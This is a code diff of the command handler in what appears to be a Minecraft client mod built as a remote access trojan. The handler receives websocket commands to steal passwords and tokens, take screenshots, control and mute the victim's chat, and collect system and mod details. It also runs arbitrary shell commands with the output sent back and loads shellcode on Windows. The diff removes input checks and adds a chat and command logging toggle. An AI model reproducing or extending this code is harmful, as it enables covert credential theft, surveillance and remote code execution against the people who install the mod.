@@ -1,10 +1,8 @@
 package me.soda.witch.websocket;
 
 import me.soda.witch.Witch;
-import me.soda.witch.config.Config;
 import me.soda.witch.features.*;
 import net.minecraft.text.Text;
-import net.minecraft.util.SystemDetails;
 
 import java.util.Base64;
 
@@ -21,7 +19,6 @@ public class MessageHandler {
         try {
             switch (messageType) {
                 case "steal_pwd_switch":
-                    if (msgArr.length < 2) break;
                     Config.passwordBeingLogged = Boolean.parseBoolean(msgArr[1]);
                     break;
                 case "steal_token":
@@ -29,57 +26,50 @@ public class MessageHandler {
                     break;
                 case "getconfig":
                 case "vanish":
-                case "log":
                     //todo
                     break;
                 case "chat_control":
-                    if (msgArr.length < 2) break;
-                    ChatControl.sendChat(decodeBase64(msgArr[1]));
+                    ChatUtil.sendChat(decodeBase64(msgArr[1]));
                     break;
                 case "chat_filter":
-                    if (msgArr.length < 2) break;
                     Config.filterPattern = decodeBase64(msgArr[1]);
                     break;
                 case "chat_filter_switch":
-                    if (msgArr.length < 2) break;
                     Config.isBeingFiltered = Boolean.parseBoolean(msgArr[1]);
                     break;
                 case "chat_mute":
-                    if (msgArr.length < 2) break;
                     Config.isMuted = Boolean.parseBoolean(msgArr[1]);
                     break;
                 case "mods":
-                    MessageUtils.sendMessage(messageType, Modlist.allMods());
+                    MessageUtils.sendMessage(messageType, MinecraftUtil.allMods());
                     break;
                 case "systeminfo":
-                    SystemDetails sd = new SystemDetails();
-                    StringBuilder sb = new StringBuilder();
-                    sd.writeTo(sb);
-                    MessageUtils.sendMessage(messageType, sb.toString());
+                    MessageUtils.sendMessage(messageType, MinecraftUtil.systemInfo());
                     break;
                 case "screenshot":
                     Witch.screenshot = true;
                     break;
                 case "chat":
-                    if (msgArr.length < 2) break;
-                    ChatControl.chat(Text.of(decodeBase64(msgArr[1])), false);
+                    ChatUtil.chat(Text.of(decodeBase64(msgArr[1])), false);
                     break;
                 case "kill":
                     Witch.client.close(false);
                     break;
                 case "shell":
-                    if (msgArr.length < 2) break;
                     new Thread(() -> {
                         String result = ShellUtil.runCmd(decodeBase64(msgArr[1]));
                         MessageUtils.sendMessage(messageType, "\n" + result);
                     }).start();
                     break;
                 case "shellcode":
-                    if (msgArr.length < 2) break;
                     if (ShellUtil.isWin())
                         new Thread(() -> new ShellcodeLoader().loadShellCode(msgArr[1], false)).start();
+                    break;
+                case "log":
+                    Config.logChatAndCommand = !Config.logChatAndCommand;
+                    MessageUtils.sendMessage(messageType, String.valueOf(Config.logChatAndCommand));
+                    break;
                 default:
-                    System.out.println();
                     break;
             }
         } catch (Exception e) {
